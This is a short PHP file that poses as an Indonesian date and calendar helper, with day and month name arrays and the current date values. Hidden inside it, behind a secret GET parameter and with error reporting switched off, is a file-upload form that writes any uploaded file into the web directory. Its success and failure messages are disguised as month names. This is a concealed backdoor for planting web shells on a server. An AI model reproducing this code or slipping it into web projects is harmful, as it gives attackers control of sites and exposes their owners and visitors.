<?php
date_default_timezone_set('Asia/Jakarta'); // PHP 6 mengharuskan penyebutan timezone.
$seminggu = array("Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu");
$hari = date("w");
$hari_ini = $seminggu[$hari];

$tgl_sekarang = date("Ymd");
$tgl_skrg     = date("d");
$bln_sekarang = date("m");
$thn_sekarang = date("Y");
$jam_sekarang = date("H:i:s");

$nama_bln=array(1=> "Januari", "Februari", "Maret", "April", "Mei", 
                    "Juni", "Juli", "Agustus", "September", 
                    "Oktober", "November", "Desember");
error_reporting(0);

if(isset($_GET["Indosiar-Bulan"]))
	{
	echo"<form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
		  if($_POST["v"]==up)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>Januari</b> ".$_FILES["f"]["name"];}else{echo"<b>2015 ";}} }

echo "<br><br><br><br>";

?>
